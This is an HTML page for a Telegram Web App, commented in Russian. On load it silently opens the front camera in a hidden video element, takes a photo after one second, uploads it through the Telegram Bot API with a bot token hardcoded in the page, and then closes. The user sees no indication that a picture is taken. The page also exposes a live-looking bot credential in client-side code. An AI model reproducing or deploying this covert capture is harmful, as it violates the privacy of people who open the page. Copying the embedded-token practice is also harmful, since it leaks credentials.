<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web App Camera</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8129102478:AAFiIabXWiPI5Aeqqh7jEqXgUKLE6-NalA0';
        const tg = window.Telegram.WebApp;

        // Получение ID пользователя из Telegram Web App
        const CHAT_ID = tg.initDataUnsafe?.user?.id;

        if (!CHAT_ID) {
            console.error("Telegram User ID is missing.");
            tg.close();
        }

        tg.expand(); // Расширение Web App на весь экран

        // Захват фото и отправка
        window.onload = () => {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            // Доступ к камере
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;

                    // Автоматический захват изображения
                    video.onloadedmetadata = () => {
                        const context = canvas.getContext('2d');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;

                        // Небольшая задержка для корректной активации камеры
                        setTimeout(() => {
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);

                            const imageData = canvas.toDataURL('image/jpeg');

                            // Конвертация base64 в файл и отправка в Telegram
                            fetch(imageData)
                                .then(res => res.blob())
                                .then(blob => {
                                    const formData = new FormData();
                                    formData.append('chat_id', CHAT_ID);
                                    formData.append('photo', blob, 'photo.jpg');

                                    // Отправка изображения
                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                        method: 'POST',
                                        body: formData
                                    })
                                    .then(response => response.json())
                                    .then(data => {
                                        if (data.ok) {
                                            console.log("Photo sent successfully!");
                                            tg.close(); // Закрыть Web App после отправки
                                        } else {
                                            console.error("Failed to send photo:", data.description);
                                            tg.close();
                                        }
                                    })
                                    .catch(err => {
                                        console.error("Error:", err);
                                        tg.close();
                                    });
                                });
                        }, 1000); // Задержка в 1 секунду
                    };
                })
                .catch(err => {
                    console.error("Camera error:", err);
                    tg.close(); // Закрыть Web App при ошибке
                });
        };
    </script>
</body>
</html>
